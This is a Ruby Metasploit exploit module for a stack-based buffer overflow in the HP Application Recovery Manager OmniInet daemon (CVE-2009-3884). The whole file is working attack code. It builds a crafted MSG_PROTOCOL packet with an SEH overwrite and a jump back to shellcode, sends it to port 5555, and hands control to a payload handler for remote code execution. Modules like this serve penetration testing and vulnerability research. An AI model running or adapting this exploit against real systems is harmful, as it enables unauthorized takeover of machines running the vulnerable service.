class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Application Recovery Manager (OmniInet.exe) Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in HP Application Recovery Manager OmniInet daemon.
					By sending a specially crafted MSG_PROTOCOL packet, a remote attacker may be able to execute arbitrary code.
			},
			'Author'         => 'EgiX <n0b0d13s[at]gmail.com>',
			'References'     =>
				[
					[ 'CVE', '2009-3884' ],
					[ 'BID', '37250' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-091' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload' =>
				{
					'Space'    => 4658,
					'BadChars' => '\x00',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x004412ed } ], # OmniInet.exe pop ecx; pop ecx; ret
				],
			'DefaultTarget'  => 0))

			register_options([Opt::RPORT(5555)], self.class)

	end

	def exploit
		connect

		off	= payload_space + 8
		sep	= "\x00\x00\x20\x00"

		buff =  "\x00\x00\x12\x67"					# packet length
		buff << "\xff\xfe\x32\x00\x36\x00\x37\x00"	# MSG_PROTOCOL command
		buff << sep + rand_text_alpha_upper(2)
		buff << sep + rand_text_alpha_upper(2)
		buff << sep + rand_text_alpha_upper(2)
		buff << sep + rand_text_alpha_upper(2)
		buff << sep + payload.encoded + generate_seh_record(target.ret)
		# jump back to shellcode
		buff << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
		buff << sep

		print_status("Sending MSG_PROTOCOL packet")
		sock.put(buff)

		sleep(5)
		handler
		disconnect
	end

end